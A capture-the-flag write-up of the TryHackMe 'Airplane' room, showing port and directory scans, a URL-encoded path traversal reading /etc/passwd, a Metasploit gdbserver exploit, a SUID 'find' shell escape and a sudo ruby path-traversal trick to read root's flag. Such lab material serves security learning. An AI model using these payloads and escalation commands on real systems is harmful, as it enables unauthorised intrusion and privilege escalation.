<code>
  
https://tryhackme.com/r/room/airplane  

### Service Enumeration
┌──(duke㉿kali)-[~/Documents/THM_AirPlane]
└─$ nmap  -sV -p- -Pn 10.10.128.237
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-13 03:08 CDT
Nmap scan report for 10.10.128.237
Host is up (0.039s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6048/tcp open  x11?
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10

http://airplane.thm:8000/?page=index.html

┌──(duke㉿kali)-[~/Documents/THM_AirPlane]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://airplane.thm:8000 -x php,txt,html -k
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
[+] Url:                     http://airplane.thm:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
2024/06/13 03:20:15 Starting gobuster in directory enumeration mode
/airplane             (Status: 200) [Size: 655]

### Found Path Traversal 
`http://airplane.thm:8000/?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`

carlos:x:1000: nothing
hudson:x:1001: get some files from home folder

### Initial Access
I found out that there is an exploit available for gdbserver, so I used the Metasploit exploit multi/gdb/gdb_server_exec. and fill all required options.

get shell as Hudson

run linpeas and

### Priv Esc
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
-rwsr-xr-x 1 carlos carlos 313K Feb 18  2020 /usr/bin/find     


hudson@airplane:/$` ./usr/bin/find . -exec /bin/sh -p \; -quit`
$ id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)

Have access to hudson home folder create own ssh key get full ssh access as **carlos**

### Priv Esc to root

carlos@airplane:/usr/bin$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    `(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb`

**Folders /Root  and /usr/bin/ruby are ofcorse locked for write**
 
 ### Wildcard Exploiting

carlos@airplane:**/home/carlos/**$ echo "puts File.read('/root/root.txt')" > x.rb

carlos@airplane:$ sudo /usr/bin/ruby **/root/../home/carlos/x.rb**


</code>
